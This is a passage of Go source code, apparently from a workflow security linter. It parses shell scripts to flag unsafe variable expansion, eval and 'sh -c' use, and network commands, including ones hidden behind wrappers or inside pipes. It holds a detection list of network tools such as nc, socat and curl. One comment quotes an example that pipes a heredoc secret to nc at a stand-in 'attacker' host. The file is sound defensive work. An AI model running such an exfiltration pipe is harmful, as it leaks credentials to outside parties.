package shell

import (
	"bytes"
	"strings"

	"mvdan.cc/sh/v3/syntax"
)

const evalCommand = "eval"

type ShellVarUsage struct {
	VarName    string
	StartPos   int
	EndPos     int
	IsQuoted   bool
	InEval     bool
	InShellCmd bool
	InCmdSubst bool
	Context    string
}

type VarArgUsage struct {
	ShellVarUsage
	CommandName       string
	ArgPosition       int
	HasDoubleDash     bool
	IsAfterDoubleDash bool
}

type ShellParser struct {
	script   string
	file     *syntax.File
	parseErr error
}

func NewShellParser(script string) *ShellParser {
	p := &ShellParser{script: script}
	parser := syntax.NewParser(syntax.KeepComments(true), syntax.Variant(syntax.LangBash))
	reader := strings.NewReader(script)
	file, err := parser.Parse(reader, "")
	if err == nil {
		p.file = file
	} else {
		p.parseErr = err
	}
	return p
}

// ParseError returns the error reported by the underlying shell parser, or
// nil if parsing succeeded. Callers should consult this when FindNetworkCommands
// (or similar walks) returns no results: a parse failure means detection was
// silently skipped, which for security rules is a false-negative risk.
func (p *ShellParser) ParseError() error {
	return p.parseErr
}

// walkContext tracks the current context during AST traversal.
type walkContext struct {
	inEval     bool
	inShellCmd bool
	inCmdSubst bool
}

func (p *ShellParser) FindEnvVarUsages(varName string) []ShellVarUsage {
	if p.file == nil {
		return nil
	}

	var usages []ShellVarUsage
	ctx := &walkContext{}
	p.walkNode(p.file, varName, ctx, &usages)
	return usages
}

// walkNode recursively traverses the AST with proper context tracking.
func (p *ShellParser) walkNode(node syntax.Node, varName string, ctx *walkContext, usages *[]ShellVarUsage) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.File:
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, ctx, usages)
		}

	case *syntax.Stmt:
		p.walkNode(x.Cmd, varName, ctx, usages)
		for _, redirect := range x.Redirs {
			p.walkNode(redirect, varName, ctx, usages)
		}

	case *syntax.CallExpr:
		cmdName := p.getCommandName(x)
		newCtx := *ctx
		if cmdName == evalCommand {
			newCtx.inEval = true
		} else if p.isShellCommand(x) {
			newCtx.inShellCmd = true
		}
		for _, assign := range x.Assigns {
			p.walkNode(assign, varName, &newCtx, usages)
		}
		for _, arg := range x.Args {
			p.walkNode(arg, varName, &newCtx, usages)
		}

	case *syntax.Assign:
		if x.Value != nil {
			p.walkNode(x.Value, varName, ctx, usages)
		}
		if x.Array != nil {
			p.walkNode(x.Array, varName, ctx, usages)
		}

	case *syntax.Word:
		for _, part := range x.Parts {
			p.walkNode(part, varName, ctx, usages)
		}

	case *syntax.DblQuoted:
		for _, part := range x.Parts {
			p.walkNode(part, varName, ctx, usages)
		}

	case *syntax.SglQuoted:
		// Single quotes don't expand variables

	case *syntax.ParamExp:
		if x.Param != nil && x.Param.Value == varName {
			usage := ShellVarUsage{
				VarName:    varName,
				StartPos:   int(x.Pos().Offset()), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
				EndPos:     int(x.End().Offset()), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
				IsQuoted:   p.isParamExpQuoted(x),
				InEval:     ctx.inEval,
				InShellCmd: ctx.inShellCmd,
				InCmdSubst: ctx.inCmdSubst,
				Context:    p.getContextFromPos(int(x.Pos().Offset()), int(x.End().Offset())), //nolint:gosec // byte offset of workflow shell scripts cannot realistically overflow int
			}
			*usages = append(*usages, usage)
		}
		// Also check nested expressions (e.g., ${var:-$default})
		if x.Exp != nil && x.Exp.Word != nil {
			p.walkNode(x.Exp.Word, varName, ctx, usages)
		}

	case *syntax.CmdSubst:
		newCtx := *ctx
		newCtx.inCmdSubst = true
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, &newCtx, usages)
		}

	case *syntax.ArithmExp:
		if x.X != nil {
			p.walkArithm(x.X, varName, ctx, usages)
		}

	case *syntax.ProcSubst:
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, ctx, usages)
		}

	case *syntax.BinaryCmd:
		p.walkNode(x.X, varName, ctx, usages)
		p.walkNode(x.Y, varName, ctx, usages)

	case *syntax.IfClause:
		for _, cond := range x.Cond {
			p.walkNode(cond, varName, ctx, usages)
		}
		for _, then := range x.Then {
			p.walkNode(then, varName, ctx, usages)
		}
		if x.Else != nil {
			p.walkNode(x.Else, varName, ctx, usages)
		}

	case *syntax.WhileClause:
		for _, cond := range x.Cond {
			p.walkNode(cond, varName, ctx, usages)
		}
		for _, do := range x.Do {
			p.walkNode(do, varName, ctx, usages)
		}

	case *syntax.ForClause:
		if x.Loop != nil {
			p.walkLoop(x.Loop, varName, ctx, usages)
		}
		for _, do := range x.Do {
			p.walkNode(do, varName, ctx, usages)
		}

	case *syntax.CaseClause:
		if x.Word != nil {
			p.walkNode(x.Word, varName, ctx, usages)
		}
		for _, item := range x.Items {
			p.walkNode(item, varName, ctx, usages)
		}

	case *syntax.CaseItem:
		for _, pattern := range x.Patterns {
			p.walkNode(pattern, varName, ctx, usages)
		}
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, ctx, usages)
		}

	case *syntax.Block:
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, ctx, usages)
		}

	case *syntax.Subshell:
		for _, stmt := range x.Stmts {
			p.walkNode(stmt, varName, ctx, usages)
		}

	case *syntax.FuncDecl:
		p.walkNode(x.Body, varName, ctx, usages)

	case *syntax.ArithmCmd:
		if x.X != nil {
			p.walkArithm(x.X, varName, ctx, usages)
		}

	case *syntax.TestClause:
		if x.X != nil {
			p.walkTest(x.X, varName, ctx, usages)
		}

	case *syntax.DeclClause:
		for _, assign := range x.Args {
			p.walkNode(assign, varName, ctx, usages)
		}

	case *syntax.Redirect:
		if x.Word != nil {
			p.walkNode(x.Word, varName, ctx, usages)
		}
		// Handle heredoc content
		if x.Hdoc != nil {
			p.walkNode(x.Hdoc, varName, ctx, usages)
		}

	case *syntax.ArrayExpr:
		for _, elem := range x.Elems {
			p.walkNode(elem, varName, ctx, usages)
		}

	case *syntax.ArrayElem:
		if x.Value != nil {
			p.walkNode(x.Value, varName, ctx, usages)
		}

	case *syntax.ExtGlob:
		if x.Pattern != nil {
			p.walkNode(x.Pattern, varName, ctx, usages)
		}

	case *syntax.BraceExp:
		for _, elem := range x.Elems {
			p.walkNode(elem, varName, ctx, usages)
		}

	case *syntax.CoprocClause:
		p.walkNode(x.Stmt, varName, ctx, usages)

	case *syntax.LetClause:
		for _, expr := range x.Exprs {
			p.walkArithm(expr, varName, ctx, usages)
		}

	case *syntax.TimeClause:
		if x.Stmt != nil {
			p.walkNode(x.Stmt, varName, ctx, usages)
		}
	}
}

// walkArithm handles arithmetic expression nodes.
func (p *ShellParser) walkArithm(node syntax.ArithmExpr, varName string, ctx *walkContext, usages *[]ShellVarUsage) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.BinaryArithm:
		p.walkArithm(x.X, varName, ctx, usages)
		p.walkArithm(x.Y, varName, ctx, usages)
	case *syntax.UnaryArithm:
		p.walkArithm(x.X, varName, ctx, usages)
	case *syntax.ParenArithm:
		p.walkArithm(x.X, varName, ctx, usages)
	case *syntax.Word:
		p.walkNode(x, varName, ctx, usages)
	}
}

// walkTest handles test expression nodes.
func (p *ShellParser) walkTest(node syntax.TestExpr, varName string, ctx *walkContext, usages *[]ShellVarUsage) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.BinaryTest:
		p.walkTest(x.X, varName, ctx, usages)
		p.walkTest(x.Y, varName, ctx, usages)
	case *syntax.UnaryTest:
		p.walkTest(x.X, varName, ctx, usages)
	case *syntax.ParenTest:
		p.walkTest(x.X, varName, ctx, usages)
	case *syntax.Word:
		p.walkNode(x, varName, ctx, usages)
	}
}

// walkLoop handles loop nodes.
func (p *ShellParser) walkLoop(node syntax.Loop, varName string, ctx *walkContext, usages *[]ShellVarUsage) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.WordIter:
		for _, word := range x.Items {
			p.walkNode(word, varName, ctx, usages)
		}
	case *syntax.CStyleLoop:
		p.walkArithm(x.Init, varName, ctx, usages)
		p.walkArithm(x.Cond, varName, ctx, usages)
		p.walkArithm(x.Post, varName, ctx, usages)
	}
}

func (p *ShellParser) isParamExpQuoted(pe *syntax.ParamExp) bool {
	var quoted bool

	syntax.Walk(p.file, func(node syntax.Node) bool {
		if dq, ok := node.(*syntax.DblQuoted); ok {
			for _, part := range dq.Parts {
				if paramExp, ok := part.(*syntax.ParamExp); ok {
					if paramExp == pe {
						quoted = true
						return false
					}
				}
			}
		}
		return true
	})

	return quoted
}

func (p *ShellParser) getCommandName(call *syntax.CallExpr) string {
	if len(call.Args) == 0 {
		return ""
	}

	var buf bytes.Buffer
	printer := syntax.NewPrinter()
	if err := printer.Print(&buf, call.Args[0]); err != nil {
		return ""
	}
	return strings.TrimSpace(buf.String())
}

func (p *ShellParser) isShellCommand(call *syntax.CallExpr) bool {
	if len(call.Args) < 2 {
		return false
	}

	cmdName := p.getCommandName(call)
	shellCmds := []string{"sh", "bash", "zsh", "ksh", "dash"}

	for _, shell := range shellCmds {
		if cmdName == shell {
			for i := 1; i < len(call.Args); i++ {
				var buf bytes.Buffer
				printer := syntax.NewPrinter()
				if err := printer.Print(&buf, call.Args[i]); err != nil {
					continue
				}
				if strings.TrimSpace(buf.String()) == "-c" {
					return true
				}
			}
		}
	}
	return false
}

func (p *ShellParser) getContextFromPos(start, end int) string {
	if start < 0 || end > len(p.script) {
		return ""
	}

	lineStart := strings.LastIndex(p.script[:start], "\n")
	if lineStart == -1 {
		lineStart = 0
	} else {
		lineStart++
	}

	lineEnd := strings.Index(p.script[end:], "\n")
	if lineEnd == -1 {
		lineEnd = len(p.script)
	} else {
		lineEnd += end
	}

	line := p.script[lineStart:lineEnd]

	if len(line) > 80 {
		relStart := start - lineStart
		contextStart := max(relStart-30, 0)
		contextEnd := min(relStart+50, len(line))
		line = "..." + line[contextStart:contextEnd] + "..."
	}

	return strings.TrimSpace(line)
}

func (u *ShellVarUsage) IsUnsafeUsage() bool {
	// Unquoted variables are always unsafe (word splitting and glob expansion)
	if !u.IsQuoted {
		return true
	}
	// Variables inside eval are unsafe even when quoted (eval parses the value again)
	if u.InEval {
		return true
	}
	// Variables inside sh -c / bash -c are unsafe even when quoted (nested shell parsing)
	if u.InShellCmd {
		return true
	}
	// Quoted variables inside command substitution are safe
	// e.g., $(echo "$VAR") is safe because the variable is quoted
	// Only unquoted variables in command substitution are dangerous (handled by !u.IsQuoted above)
	return false
}

func (p *ShellParser) HasDangerousPattern() bool {
	if p.file == nil {
		return false
	}

	var found bool
	syntax.Walk(p.file, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			cmdName := p.getCommandName(call)
			if cmdName == evalCommand || p.isShellCommand(call) {
				found = true
				return false
			}
		}
		return true
	})

	return found
}

func (p *ShellParser) GetDangerousPatternType() string {
	if p.file == nil {
		return ""
	}

	var patternType string
	syntax.Walk(p.file, func(node syntax.Node) bool {
		if call, ok := node.(*syntax.CallExpr); ok {
			cmdName := p.getCommandName(call)
			if cmdName == evalCommand {
				patternType = evalCommand
				return false
			}
			if p.isShellCommand(call) {
				patternType = cmdName + " -c"
				return false
			}
		}
		return true
	})

	return patternType
}

type NetworkCommandCall struct {
	CommandName string
	Args        []CommandArg
	// PipeInputs is conservative argv metadata from upstream pipeline producers,
	// not exact stdout dataflow.
	PipeInputs []CommandArg
	// StdinInputs is conservative word metadata from stdin redirects such as
	// here-strings and heredocs.
	StdinInputs []CommandArg
	Position    syntax.Pos
	InCmdSubst  bool
	InPipe      bool
	// InnerScript is the literal script text when this call was extracted from
	// a wrapper such as `bash -c '...'` / `eval '...'`. Empty when the call is
	// found in the outer script directly. Downstream analyses that need to
	// resolve shell-variable assignments in scope of the call should use this
	// (with InnerOffset) instead of the outer script — assignments inside the
	// wrapper's quoted body are otherwise invisible to outer-script regexes.
	InnerScript string
	// InnerOffset is the call's byte offset within InnerScript before
	// rewriteCallPositions overwrites Position. Meaningless when InnerScript
	// is empty.
	InnerOffset uint
}

type CommandArg struct {
	Value        string
	LiteralValue string
	Position     syntax.Pos
	IsFlag       bool
	VarNames     []string
	GHAExprs     []string
}

func (p *ShellParser) FindNetworkCommands() []NetworkCommandCall {
	if p.file == nil {
		return nil
	}

	var calls []NetworkCommandCall
	ctx := &networkWalkContext{}
	p.walkForNetworkCommands(p.file, ctx, &calls)
	return calls
}

type networkWalkContext struct {
	inCmdSubst  bool
	inPipe      bool
	pipeInputs  []CommandArg
	stdinInputs []CommandArg
}

func (p *ShellParser) walkForNetworkCommands(node syntax.Node, ctx *networkWalkContext, calls *[]NetworkCommandCall) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.File:
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, ctx, calls)
		}

	case *syntax.Stmt:
		stmtCtx := *ctx
		stmtCtx.stdinInputs = p.collectStdinRedirectArgs(x.Redirs)
		p.walkForNetworkCommands(x.Cmd, &stmtCtx, calls)
		for _, redirect := range x.Redirs {
			p.walkForNetworkCommands(redirect, ctx, calls)
		}

	case *syntax.CallExpr:
		cmdIdx, cmdName, ok := p.networkCommandInCall(x)
		if ok {
			call := p.parseNetworkCommand(x, ctx, cmdIdx, cmdName)
			*calls = append(*calls, call)
		} else if scripts, isWrapper := p.shellWrapperScripts(x); isWrapper {
			// bash -c / sh -c / eval — re-parse the inline script and walk it
			// so nested network calls are still detected.
			for _, s := range scripts {
				p.walkInlineScript(s.script, s.fallbackPos, ctx, calls)
			}
		}

		for _, assign := range x.Assigns {
			p.walkForNetworkCommands(assign, ctx, calls)
		}
		for _, arg := range x.Args {
			p.walkForNetworkCommands(arg, ctx, calls)
		}

	case *syntax.BinaryCmd:
		if isPipeOp(x.Op) {
			leftCtx := *ctx
			leftCtx.inPipe = true
			p.walkForNetworkCommands(x.X, &leftCtx, calls)

			rightCtx := *ctx
			rightCtx.inPipe = true
			rightCtx.pipeInputs = p.collectPipeInputArgs(x.X)
			p.walkForNetworkCommands(x.Y, &rightCtx, calls)
			return
		}

		p.walkForNetworkCommands(x.X, ctx, calls)
		p.walkForNetworkCommands(x.Y, ctx, calls)

	case *syntax.CmdSubst:
		newCtx := *ctx
		newCtx.inCmdSubst = true
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, &newCtx, calls)
		}

	case *syntax.IfClause:
		for _, cond := range x.Cond {
			p.walkForNetworkCommands(cond, ctx, calls)
		}
		for _, then := range x.Then {
			p.walkForNetworkCommands(then, ctx, calls)
		}
		if x.Else != nil {
			p.walkForNetworkCommands(x.Else, ctx, calls)
		}

	case *syntax.WhileClause:
		for _, cond := range x.Cond {
			p.walkForNetworkCommands(cond, ctx, calls)
		}
		for _, do := range x.Do {
			p.walkForNetworkCommands(do, ctx, calls)
		}

	case *syntax.ForClause:
		if x.Loop != nil {
			p.walkForNetworkCommandsLoop(x.Loop, ctx, calls)
		}
		for _, do := range x.Do {
			p.walkForNetworkCommands(do, ctx, calls)
		}

	case *syntax.CaseClause:
		if x.Word != nil {
			p.walkForNetworkCommands(x.Word, ctx, calls)
		}
		for _, item := range x.Items {
			p.walkForNetworkCommands(item, ctx, calls)
		}

	case *syntax.CaseItem:
		for _, pattern := range x.Patterns {
			p.walkForNetworkCommands(pattern, ctx, calls)
		}
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, ctx, calls)
		}

	case *syntax.Block:
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, ctx, calls)
		}

	case *syntax.Subshell:
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, ctx, calls)
		}

	case *syntax.FuncDecl:
		p.walkForNetworkCommands(x.Body, ctx, calls)

	case *syntax.ProcSubst:
		for _, stmt := range x.Stmts {
			p.walkForNetworkCommands(stmt, ctx, calls)
		}

	case *syntax.ArithmCmd:
		// Arithmetic commands don't contain network calls

	case *syntax.TestClause:
		p.walkForNetworkCommandsTest(x.X, ctx, calls)

	case *syntax.DeclClause:
		for _, assign := range x.Args {
			p.walkForNetworkCommands(assign, ctx, calls)
		}

	case *syntax.Assign:
		if x.Value != nil {
			p.walkForNetworkCommands(x.Value, ctx, calls)
		}
		if x.Array != nil {
			p.walkForNetworkCommands(x.Array, ctx, calls)
		}

	case *syntax.ArrayExpr:
		for _, elem := range x.Elems {
			p.walkForNetworkCommands(elem, ctx, calls)
		}

	case *syntax.ArrayElem:
		if x.Value != nil {
			p.walkForNetworkCommands(x.Value, ctx, calls)
		}

	case *syntax.CoprocClause:
		p.walkForNetworkCommands(x.Stmt, ctx, calls)

	case *syntax.TimeClause:
		if x.Stmt != nil {
			p.walkForNetworkCommands(x.Stmt, ctx, calls)
		}

	case *syntax.Word:
		for _, part := range x.Parts {
			p.walkForNetworkCommands(part, ctx, calls)
		}

	case *syntax.DblQuoted:
		for _, part := range x.Parts {
			p.walkForNetworkCommands(part, ctx, calls)
		}

	case *syntax.SglQuoted, *syntax.ParamExp, *syntax.Redirect, *syntax.Lit:
		// These nodes don't contain network commands
	}
}

func isPipeOp(op syntax.BinCmdOperator) bool {
	return op == syntax.Pipe || op == syntax.PipeAll
}

// walkForNetworkCommandsLoop handles loop nodes for network command detection.
func (p *ShellParser) walkForNetworkCommandsLoop(node syntax.Loop, ctx *networkWalkContext, calls *[]NetworkCommandCall) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.WordIter:
		for _, word := range x.Items {
			p.walkForNetworkCommands(word, ctx, calls)
		}
	case *syntax.CStyleLoop:
		// C-style loop expressions don't contain network commands
	}
}

// walkForNetworkCommandsTest handles test expressions for network command detection.
func (p *ShellParser) walkForNetworkCommandsTest(node syntax.TestExpr, ctx *networkWalkContext, calls *[]NetworkCommandCall) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.BinaryTest:
		p.walkForNetworkCommandsTest(x.X, ctx, calls)
		p.walkForNetworkCommandsTest(x.Y, ctx, calls)
	case *syntax.UnaryTest:
		p.walkForNetworkCommandsTest(x.X, ctx, calls)
	case *syntax.ParenTest:
		p.walkForNetworkCommandsTest(x.X, ctx, calls)
	case *syntax.Word:
		p.walkForNetworkCommands(x, ctx, calls)
	}
}

func (p *ShellParser) isNetworkCommand(cmdName string) bool {
	networkCmds := map[string]bool{
		"curl":     true,
		"wget":     true,
		"nc":       true,
		"netcat":   true,
		"ncat":     true,
		"telnet":   true,
		"socat":    true,
		"dig":      true,
		"nslookup": true,
		"host":     true,
		"http":     true,
		"https":    true,
	}
	return networkCmds[cmdName]
}

func (p *ShellParser) networkCommandInCall(call *syntax.CallExpr) (int, string, bool) {
	if len(call.Args) == 0 {
		return -1, "", false
	}

	cmdName := p.commandWordValue(call.Args[0])
	if p.isNetworkCommand(cmdName) {
		return 0, cmdName, true
	}

	switch cmdName {
	case "command", "builtin":
		return p.networkCommandAfterCommandWrapper(call, 1)
	case "env":
		return p.networkCommandAfterEnvWrapper(call)
	case "sudo":
		return p.networkCommandAfterOptionWrapper(call, sudoOptionsConsumingNextArg())
	case "doas":
		return p.networkCommandAfterOptionWrapper(call, map[string]bool{"-u": true})
	case "nohup":
		return p.networkCommandAfterCommandWrapper(call, 1)
	case "xargs":
		return p.networkCommandAfterOptionWrapper(call, xargsOptionsConsumingNextArg())
	case "parallel":
		return p.networkCommandAfterOptionWrapper(call, parallelOptionsConsumingNextArg())
	default:
		return -1, "", false
	}
}

func (p *ShellParser) networkCommandAfterCommandWrapper(call *syntax.CallExpr, start int) (int, string, bool) {
	for idx := start; idx < len(call.Args); idx++ {
		value := p.commandWordValue(call.Args[idx])
		if value == "--" {
			continue
		}
		if strings.HasPrefix(value, "-") {
			continue
		}
		if p.isNetworkCommand(value) {
			return idx, value, true
		}
		return -1, "", false
	}
	return -1, "", false
}

func (p *ShellParser) networkCommandAfterEnvWrapper(call *syntax.CallExpr) (int, string, bool) {
	consuming := envOptionsConsumingNextArg()
	for idx := 1; idx < len(call.Args); idx++ {
		value := p.commandWordValue(call.Args[idx])
		if value == "--" {
			continue
		}
		if strings.HasPrefix(value, "--") {
			option := value
			if eqIdx := strings.Index(option, "="); eqIdx >= 0 {
				option = option[:eqIdx]
			}
			if consuming[option] && !strings.Contains(value, "=") {
				idx++
			}
			continue
		}
		if strings.HasPrefix(value, "-") && value != "-" {
			if consuming[value] {
				idx++
			}
			continue
		}
		if strings.Contains(value, "=") && !strings.HasPrefix(value, "=") {
			continue
		}
		if p.isNetworkCommand(value) {
			return idx, value, true
		}
		return -1, "", false
	}
	return -1, "", false
}

// envOptionsConsumingNextArg returns the env(1) options that take a following
// argument. Without consuming the operand, a call such as
// `env -u OLD_TOKEN curl ...` would be misclassified: OLD_TOKEN would be
// inspected as the wrapped command, fail isNetworkCommand, and the actual curl
// be silently dropped from detection.
func envOptionsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-u": true, "--unset": true,
		"-C": true, "--chdir": true,
		"-S": true, "--split-string": true,
	}
}

func (p *ShellParser) networkCommandAfterOptionWrapper(call *syntax.CallExpr, consumingOptions map[string]bool) (int, string, bool) {
	for idx := 1; idx < len(call.Args); idx++ {
		value := p.commandWordValue(call.Args[idx])
		if value == "--" {
			continue
		}
		if strings.HasPrefix(value, "--") {
			option := value
			if eqIdx := strings.Index(option, "="); eqIdx >= 0 {
				option = option[:eqIdx]
			}
			if consumingOptions[option] && !strings.Contains(value, "=") {
				idx++
			}
			continue
		}
		if strings.HasPrefix(value, "-") && value != "-" {
			if consumingOptions[value] {
				idx++
			}
			continue
		}
		if p.isNetworkCommand(value) {
			return idx, value, true
		}
		return -1, "", false
	}
	return -1, "", false
}

// shellWrapperScript is an inline script extracted from a wrapper such as
// `bash -c <SCRIPT>` or `eval <SCRIPT>`.
type shellWrapperScript struct {
	script      string
	fallbackPos syntax.Pos
}

// shellWrapperScripts returns the inline scripts passed to a recognized shell
// wrapper (bash/sh/zsh/ksh/dash with -c, or eval). When the call is not a
// wrapper, it returns (nil, false). When it is a wrapper but no inline script
// can be extracted (e.g., -c without a following argument), it returns
// (nil, true) to signal the call is a wrapper but does not need re-parsing.
func (p *ShellParser) shellWrapperScripts(call *syntax.CallExpr) ([]shellWrapperScript, bool) {
	if len(call.Args) < 2 {
		return nil, false
	}
	cmdName := p.commandWordValue(call.Args[0])
	switch cmdName {
	case evalCommand:
		// eval concatenates its args before executing. For coarse network-sink
		// detection, treat each argument as a candidate inline script.
		var scripts []shellWrapperScript
		for _, w := range call.Args[1:] {
			value := p.commandWordValue(w)
			if value == "" {
				continue
			}
			scripts = append(scripts, shellWrapperScript{script: value, fallbackPos: w.Pos()})
		}
		return scripts, true
	case "sh", "bash", "zsh", "ksh", "dash":
		for i := 1; i < len(call.Args)-1; i++ {
			value := p.commandWordValue(call.Args[i])
			if value == "-c" {
				inner := p.commandWordValue(call.Args[i+1])
				if inner == "" {
					return nil, true
				}
				return []shellWrapperScript{{script: inner, fallbackPos: call.Args[i+1].Pos()}}, true
			}
		}
	}
	return nil, false
}

// walkInlineScript re-parses an inline script extracted from a wrapper (e.g.
// `bash -c "..."`) and merges any network-command findings into calls.
// Positions on each appended call (including its args, pipe inputs, and
// stdin inputs) are rewritten to fallbackPos so error reports map to the
// outer wrapper rather than the inner re-parsed offsets, which would not be
// meaningful in the user's workflow file.
func (p *ShellParser) walkInlineScript(script string, fallbackPos syntax.Pos, ctx *networkWalkContext, calls *[]NetworkCommandCall) {
	if script == "" {
		return
	}
	inner := NewShellParser(script)
	if inner.file == nil {
		return
	}
	before := len(*calls)
	innerCtx := *ctx
	inner.walkForNetworkCommands(inner.file, &innerCtx, calls)
	for i := before; i < len(*calls); i++ {
		c := &(*calls)[i]
		// Preserve the SHALLOWEST inner script that contains this call.
		// Nested wrappers (`bash -c 'eval "..."'`) call walkInlineScript
		// recursively; the innermost run sets InnerScript first, outer
		// runs must not overwrite it because shell-assignment resolution
		// needs the script in which the curl actually sits.
		if c.InnerScript == "" {
			c.InnerScript = script
			c.InnerOffset = c.Position.Offset()
		}
		rewriteCallPositions(c, fallbackPos)
	}
}

// rewriteCallPositions overrides Position fields on a NetworkCommandCall and
// all of its associated argument groups. Used when re-parsing an inline
// wrapped script so that downstream offset-based lookups (against the outer
// script) and line/col reporting both target the wrapper's location.
func rewriteCallPositions(c *NetworkCommandCall, pos syntax.Pos) {
	c.Position = pos
	for i := range c.Args {
		c.Args[i].Position = pos
	}
	for i := range c.PipeInputs {
		c.PipeInputs[i].Position = pos
	}
	for i := range c.StdinInputs {
		c.StdinInputs[i].Position = pos
	}
}

// xargsOptionsConsumingNextArg returns the xargs short/long options that
// take a following argument, so the wrapper resolver can skip past them to
// find the underlying command. Joined forms (e.g. "-I{}") are handled by
// networkCommandAfterOptionWrapper because the entire token starts with "-"
// and is treated as a flag without consuming the next arg.
func xargsOptionsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-I":                 true,
		"--replace":          true,
		"-i":                 true,
		"-n":                 true,
		"--max-args":         true,
		"-P":                 true,
		"--max-procs":        true,
		"-L":                 true,
		"--max-lines":        true,
		"-s":                 true,
		"--max-chars":        true,
		"-d":                 true,
		"--delimiter":        true,
		"-E":                 true,
		"-a":                 true,
		"--arg-file":         true,
		"--process-slot-var": true,
	}
}

// parallelOptionsConsumingNextArg returns the GNU parallel options that take
// a following argument. Conservative subset; unknown flags fall through as
// unrecognized and the wrapper bails out, so missing entries cause FNs not
// FPs.
func parallelOptionsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-j":            true,
		"--jobs":        true,
		"-N":            true,
		"-n":            true,
		"-L":            true,
		"-S":            true,
		"--sshlogin":    true,
		"-a":            true,
		"--arg-file":    true,
		"--colsep":      true,
		"-d":            true,
		"--delimiter":   true,
		"-I":            true,
		"--replace":     true,
		"--results":     true,
		"--joblog":      true,
		"--retries":     true,
		"--timeout":     true,
		"--workdir":     true,
		"--basefile":    true,
		"--transferred": true,
	}
}

func sudoOptionsConsumingNextArg() map[string]bool {
	return map[string]bool{
		"-C":                true,
		"--close-from":      true,
		"-g":                true,
		"--group":           true,
		"-h":                true,
		"--host":            true,
		"-p":                true,
		"--prompt":          true,
		"-r":                true,
		"--role":            true,
		"-t":                true,
		"--type":            true,
		"-T":                true,
		"--command-timeout": true,
		"-u":                true,
		"--user":            true,
		"-U":                true,
		"--other-user":      true,
	}
}

func (p *ShellParser) commandWordValue(word *syntax.Word) string {
	value := p.extractLiteralValue(word)
	if value == "" {
		value = p.wordToString(word)
	}
	return strings.TrimSpace(value)
}

func (p *ShellParser) parseNetworkCommand(call *syntax.CallExpr, ctx *networkWalkContext, cmdIdx int, cmdName string) NetworkCommandCall {
	cmd := NetworkCommandCall{
		CommandName: cmdName,
		PipeInputs:  append([]CommandArg(nil), ctx.pipeInputs...),
		StdinInputs: append([]CommandArg(nil), ctx.stdinInputs...),
		Position:    call.Args[cmdIdx].Pos(),
		InCmdSubst:  ctx.inCmdSubst,
		InPipe:      ctx.inPipe,
	}

	for i := cmdIdx + 1; i < len(call.Args); i++ {
		arg := p.parseCommandArg(call.Args[i])
		cmd.Args = append(cmd.Args, arg)
	}

	return cmd
}

func (p *ShellParser) collectStdinRedirectArgs(redirs []*syntax.Redirect) []CommandArg {
	var args []CommandArg
	for _, redir := range redirs {
		if redir == nil {
			continue
		}
		if redir.N != nil && redir.N.Value != "0" {
			continue
		}
		switch redir.Op {
		case syntax.WordHdoc:
			if redir.Word != nil {
				args = append(args, p.parseCommandArg(redir.Word))
			}
		case syntax.Hdoc, syntax.DashHdoc:
			if redir.Hdoc != nil {
				args = append(args, p.parseCommandArg(redir.Hdoc))
			}
		}
	}
	return args
}

func (p *ShellParser) collectPipeInputArgs(node syntax.Node) []CommandArg {
	if node == nil {
		return nil
	}

	var args []CommandArg
	p.collectPipeInputArgsInto(node, &args)
	return args
}

func (p *ShellParser) collectPipeInputArgsInto(node syntax.Node, args *[]CommandArg) {
	if node == nil {
		return
	}

	switch x := node.(type) {
	case *syntax.File:
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	case *syntax.Stmt:
		p.collectPipeInputArgsInto(x.Cmd, args)
		for _, redirect := range x.Redirs {
			p.collectPipeInputArgsInto(redirect, args)
		}
	case *syntax.Redirect:
		// Producer-side stdin redirects (heredoc, here-string) carry
		// content the producer streams to its stdout, which then flows
		// through the pipe to the consumer. Without this case, a script
		// like `cat <<EOF | nc attacker 443\nSECRET\nEOF` loses the
		// secret entirely from PipeInputs.
		if x.N != nil && x.N.Value != "0" {
			return
		}
		switch x.Op {
		case syntax.WordHdoc:
			if x.Word != nil {
				*args = append(*args, p.parseCommandArg(x.Word))
			}
		case syntax.Hdoc, syntax.DashHdoc:
			if x.Hdoc != nil {
				*args = append(*args, p.parseCommandArg(x.Hdoc))
			}
		}
	case *syntax.CallExpr:
		if len(x.Args) < 2 {
			return
		}
		for _, word := range x.Args[1:] {
			*args = append(*args, p.parseCommandArg(word))
		}
	case *syntax.BinaryCmd:
		if isPipeOp(x.Op) {
			p.collectPipeInputArgsInto(x.X, args)
			p.collectPipeInputArgsInto(x.Y, args)
			return
		}
		p.collectPipeInputArgsInto(x.X, args)
		p.collectPipeInputArgsInto(x.Y, args)
	case *syntax.Block:
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	case *syntax.Subshell:
		for _, stmt := range x.Stmts {
			p.collectPipeInputArgsInto(stmt, args)
		}
	case *syntax.IfClause:
		for _, cond := range x.Cond {
			p.collectPipeInputArgsInto(cond, args)
		}
		for _, then := range x.Then {
			p.collectPipeInputArgsInto(then, args)
		}
		if x.Else != nil {
			p.collectPipeInputArgsInto(x.Else, args)
		}
	case *syntax.WhileClause:
		for _, cond := range x.Cond {
